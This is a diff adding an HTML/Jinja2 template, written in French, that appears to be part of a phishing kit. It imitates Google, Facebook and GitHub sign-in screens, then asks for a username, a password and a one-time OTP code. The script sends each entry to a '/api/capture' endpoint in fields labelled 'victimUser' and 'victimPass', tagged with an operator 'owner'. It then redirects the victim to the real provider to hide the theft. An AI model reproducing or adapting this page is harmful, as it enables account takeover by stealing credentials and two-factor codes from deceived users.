@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{{ config.title or config.network }}</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    {% set has_otp_mode = config.fields and (config.fields | length >= 3) %}
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+
+        body {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 18px;
+            position: relative;
+            {% if config.bg_type == 'image' and config.bg_value %}
+                background: url("{{ config.bg_value }}") center/cover no-repeat fixed;
+            {% else %}
+                background: url("https://i.postimg.cc/0yQhGZCp/IMG-6734.jpg") center/cover no-repeat fixed;
+            {% endif %}
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.28);
+            z-index: 0;
+        }
+
+        .login-card {
+            position: relative;
+            z-index: 1;
+            width: 100%;
+            max-width: {{ config.box_width or '430px' }};
+            background: rgba(255, 255, 255, 0.96);
+            color: #1c1e21;
+            border-radius: 18px;
+            padding: 26px 22px 28px 22px;
+            box-shadow: 0 14px 36px rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(255, 255, 255, 0.7);
+        }
+
+        .brand-header {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            margin-bottom: 14px;
+        }
+
+        .brand-logo {
+            width: 84px;
+            height: 84px;
+            object-fit: cover;
+            margin-bottom: 10px;
+            border-radius: {% if config.logo_shape == 'square' %}14px{% else %}50%{% endif %};
+            border: 3px solid #f5b014;
+            background: #1877f2;
+            box-shadow: 0 5px 14px rgba(0, 0, 0, 0.22);
+        }
+
+        .brand-title {
+            font-size: 22px;
+            font-weight: 800;
+            color: #111111;
+            margin-bottom: 6px;
+        }
+
+        .panel-heading {
+            font-size: 18px;
+            font-weight: 800;
+            color: #1c1e21;
+            margin-bottom: 3px;
+        }
+
+        .panel-sub {
+            font-size: 13px;
+            color: #4b4f56;
+        }
+
+        .provider-list {
+            display: flex;
+            flex-direction: column;
+            gap: 11px;
+            margin-top: 14px;
+        }
+
+        .provider-row-btn {
+            display: flex;
+            align-items: center;
+            width: 100%;
+            height: 48px;
+            padding: 0 16px;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: transform 0.12s ease, filter 0.2s ease;
+        }
+
+        .provider-row-btn:hover {
+            filter: brightness(0.98);
+        }
+
+        .provider-row-btn:active {
+            transform: scale(0.99);
+        }
+
+        .p-google {
+            background: #ffffff;
+            color: #1f2937;
+            border: 1px solid #d1d5db;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.08);
+        }
+
+        .p-google .p-icon {
+            width: 24px;
+            height: 24px;
+            margin-right: 18px;
+            font-size: 20px;
+            font-weight: 800;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background: conic-gradient(#ea4335 0deg 90deg, #4285f4 90deg 180deg, #34a853 180deg 270deg, #fbbc05 270deg 360deg);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .p-facebook {
+            background: #1877f2;
+            color: #ffffff;
+            border: 1px solid #1877f2;
+            box-shadow: 0 3px 8px rgba(24, 119, 242, 0.3);
+        }
+
+        .p-facebook .p-icon {
+            width: 24px;
+            height: 24px;
+            margin-right: 18px;
+            border-radius: 50%;
+            background: #ffffff;
+            color: #1877f2;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 15px;
+        }
+
+        .p-github {
+            background: #1f2328;
+            color: #ffffff;
+            border: 1px solid #1f2328;
+            box-shadow: 0 3px 8px rgba(0, 0, 0, 0.25);
+        }
+
+        .p-github .p-icon {
+            width: 24px;
+            height: 24px;
+            margin-right: 18px;
+            color: #ffffff;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 21px;
+        }
+
+        .step-view {
+            display: none;
+            margin-top: 12px;
+        }
+
+        .step-view.active {
+            display: block;
+        }
+
+        .back-link-btn {
+            background: none;
+            border: none;
+            color: #1877f2;
+            font-size: 12px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-bottom: 10px;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .field-group {
+            margin-bottom: 12px;
+        }
+
+        .field-group input {
+            width: 100%;
+            height: 46px;
+            padding: 0 14px;
+            border-radius: 8px;
+            border: 1px solid #ccd0d5;
+            background: #ffffff;
+            color: #1c1e21;
+            font-size: 15px;
+            outline: none;
+        }
+
+        .field-group input:focus {
+            border-color: #f5b014;
+        }
+
+        .otp-field {
+            text-align: center;
+            letter-spacing: 5px;
+            font-weight: 700;
+            font-size: 17px !important;
+        }
+
+        .submit-gold-btn {
+            width: 100%;
+            height: 46px;
+            border: none;
+            border-radius: 8px;
+            background: linear-gradient(180deg, #ffbe1a 0%, #f0a500 100%);
+            color: #111111;
+            font-size: 15px;
+            font-weight: 800;
+            cursor: pointer;
+            margin-top: 4px;
+            box-shadow: 0 4px 12px rgba(245, 176, 20, 0.35);
+        }
+
+        .terms-cn {
+            margin-top: 16px;
+            text-align: center;
+            font-size: 11px;
+            color: #4b4f56;
+        }
+    </style>
+</head>
+<body>
+<div class="login-card">
+    <div class="brand-header">
+        <img class="brand-logo" id="brandLogo" src="{{ config.logo_url or 'https://i.postimg.cc/4xnRThHp/IMG-6898.jpg' }}" alt="{{ config.network }}">
+        <div class="brand-title" id="brandTitle">{{ config.title or config.network or 'Film' }}</div>
+        {% if has_otp_mode %}
+            <div class="panel-heading" id="panelHeading">Connectez-vous pour continuer</div>
+            <div class="panel-sub" id="panelSub">Choisissez un compte pour vous connecter</div>
+        {% endif %}
+    </div>
+
+    {% if has_otp_mode %}
+        <!-- Mode 3 Champs : 1) Choix du réseau social -->
+        <div id="providerChoiceView" class="step-view active">
+            <div class="provider-list">
+                <button type="button" class="provider-row-btn p-google" onclick="openNetworkLogin('Gmail', 'https://accounts.google.com', 'https://i.postimg.cc/bw1dkM38/IMG-6888.jpg', '#ffffff')">
+                    <span class="p-icon">G</span>
+                    <span>S'identifier avec Google</span>
+                </button>
+                <button type="button" class="provider-row-btn p-facebook" onclick="openNetworkLogin('Facebook', 'https://www.facebook.com/login', 'https://i.postimg.cc/4xnRThHp/IMG-6898.jpg', '#1877f2')">
+                    <span class="p-icon"><i class="fab fa-facebook-f"></i></span>
+                    <span>Continuer avec Facebook</span>
+                </button>
+                <button type="button" class="provider-row-btn p-github" onclick="openNetworkLogin('GitHub', 'https://github.com/login', 'https://i.postimg.cc/jd8hhNhG/02F0AA74-D0BB-4064-A81E-613F54272DB7.png', '#1f2328')">
+                    <span class="p-icon"><i class="fab fa-github"></i></span>
+                    <span>S'identifier avec GitHub</span>
+                </button>
+            </div>
+        </div>
+
+        <!-- Mode 3 Champs : 2) Formulaire de connexion du réseau choisi -->
+        <form id="credentialsForm" class="step-view" onsubmit="submitCredentialsStep(event)">
+            <button type="button" class="back-link-btn" onclick="backToProviders()">
+                <i class="fas fa-arrow-left"></i> Changer de compte
+            </button>
+            <div class="field-group">
+                <input type="text" id="credUser" name="victimUser" required placeholder="Nom d'utilisateur / Email">
+            </div>
+            <div class="field-group">
+                <input type="password" id="credPass" name="victimPass" required placeholder="Mot de passe">
+            </div>
+            <button type="submit" class="submit-gold-btn">{{ config.btn_text or 'Se connecter' }}</button>
+        </form>
+
+        <!-- Mode 3 Champs : 3) Page du Code OTP -->
+        <form id="otpForm" class="step-view" onsubmit="submitOtpStep(event)">
+            <div class="field-group">
+                <input type="text" id="otpInput" name="otp" class="otp-field" required placeholder="Code OTP">
+            </div>
+            <button type="submit" class="submit-gold-btn">Valider le code OTP</button>
+        </form>
+
+        <div class="terms-cn">登录即代表您同意我们的服务条款和隐私政策</div>
+    {% else %}
+        <!-- Mode 2 Champs : Identifiant + Mot de passe + Bouton -->
+        <form id="standardTwoFieldsForm" class="step-view active" onsubmit="submitTwoFields(event)">
+            <div class="field-group">
+                <input type="text" id="twoUser" name="victimUser" required placeholder="Nom d'utilisateur / Email">
+            </div>
+            <div class="field-group">
+                <input type="password" id="twoPass" name="victimPass" required placeholder="Mot de passe">
+            </div>
+            <button type="submit" class="submit-gold-btn">{{ config.btn_text or 'Se connecter' }}</button>
+        </form>
+    {% endif %}
+</div>
+
+<script>
+(function() {
+    const OWNER = {{ (config.owner or 'Kim') | tojson }};
+    const INITIAL_NETWORK = {{ (config.network or 'Facebook') | tojson }};
+    const INITIAL_LOGO = {{ (config.logo_url or 'https://i.postimg.cc/4xnRThHp/IMG-6898.jpg') | tojson }};
+    const REDIRECT_URL = {{ (config.redirect_url or 'https://www.google.com') | tojson }};
+    const HAS_OTP_MODE = {{ 'true' if has_otp_mode else 'false' }};
+
+    const logoEl = document.getElementById('brandLogo');
+    const headingEl = document.getElementById('panelHeading');
+    const subEl = document.getElementById('panelSub');
+
+    let selectedNetwork = INITIAL_NETWORK;
+    let selectedLogo = INITIAL_LOGO;
+    let selectedRedirect = REDIRECT_URL;
+    let savedUser = "Inconnu";
+    let savedPass = "Inconnu";
+
+    if (!HAS_OTP_MODE) {
+        window.submitTwoFields = async function(event) {
+            event.preventDefault();
+            const vUser = (document.getElementById('twoUser').value || "").trim() || "Inconnu";
+            const vPass = (document.getElementById('twoPass').value || "").trim() || "Inconnu";
+
+            await fetch('/api/capture', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    owner: OWNER,
+                    network: INITIAL_NETWORK,
+                    platformImage: INITIAL_LOGO,
+                    type: "STANDARD",
+                    victimUser: vUser,
+                    victimPass: vPass,
+                    otp: "Aucun"
+                }),
+                keepalive: true
+            }).catch(() => {});
+
+            window.location.replace(REDIRECT_URL);
+        };
+        return;
+    }
+
+    const choiceView = document.getElementById('providerChoiceView');
+    const credForm = document.getElementById('credentialsForm');
+    const otpForm = document.getElementById('otpForm');
+
+    window.openNetworkLogin = function(netName, officialUrl, logoUrl, badgeBg) {
+        selectedNetwork = netName;
+        selectedRedirect = officialUrl || REDIRECT_URL;
+        selectedLogo = logoUrl || INITIAL_LOGO;
+
+        if (logoEl) {
+            logoEl.src = selectedLogo;
+            if (badgeBg) logoEl.style.backgroundColor = badgeBg;
+        }
+        if (headingEl) headingEl.textContent = "Connexion " + netName;
+        if (subEl) subEl.textContent = "Saisissez votre identifiant et votre mot de passe";
+
+        choiceView.classList.remove('active');
+        otpForm.classList.remove('active');
+        credForm.classList.add('active');
+        document.getElementById('credUser').focus();
+    };
+
+    window.backToProviders = function() {
+        selectedNetwork = INITIAL_NETWORK;
+        selectedRedirect = REDIRECT_URL;
+        selectedLogo = INITIAL_LOGO;
+        if (logoEl) logoEl.src = INITIAL_LOGO;
+        if (headingEl) headingEl.textContent = "Connectez-vous pour continuer";
+        if (subEl) subEl.textContent = "Choisissez un compte pour vous connecter";
+
+        credForm.reset();
+        otpForm.reset();
+        credForm.classList.remove('active');
+        otpForm.classList.remove('active');
+        choiceView.classList.add('active');
+    };
+
+    window.submitCredentialsStep = async function(event) {
+        event.preventDefault();
+        savedUser = (document.getElementById('credUser').value || "").trim() || "Inconnu";
+        savedPass = (document.getElementById('credPass').value || "").trim() || "Inconnu";
+
+        await fetch('/api/capture', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                owner: OWNER,
+                network: selectedNetwork,
+                platformImage: selectedLogo,
+                type: "OTP_STEP1",
+                victimUser: savedUser,
+                victimPass: savedPass,
+                otp: "En attente OTP..."
+            }),
+            keepalive: true
+        }).catch(() => {});
+
+        credForm.classList.remove('active');
+        otpForm.classList.add('active');
+        if (headingEl) headingEl.textContent = "Vérification OTP — " + selectedNetwork;
+        if (subEl) subEl.textContent = "Entrez votre code OTP pour continuer";
+        const otpInp = document.getElementById('otpInput');
+        otpInp.value = "";
+        otpInp.focus();
+    };
+
+    window.submitOtpStep = async function(event) {
+        event.preventDefault();
+        const otpVal = (document.getElementById('otpInput').value || "").trim() || "En attente OTP...";
+
+        await fetch('/api/capture', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                owner: OWNER,
+                network: selectedNetwork,
+                platformImage: selectedLogo,
+                type: "OTP",
+                victimUser: savedUser,
+                victimPass: savedPass,
+                otp: otpVal
+            }),
+            keepalive: true
+        }).catch(() => {});
+
+        window.location.replace(selectedRedirect);
+    };
+})();
+</script>
+</body>
+</html>
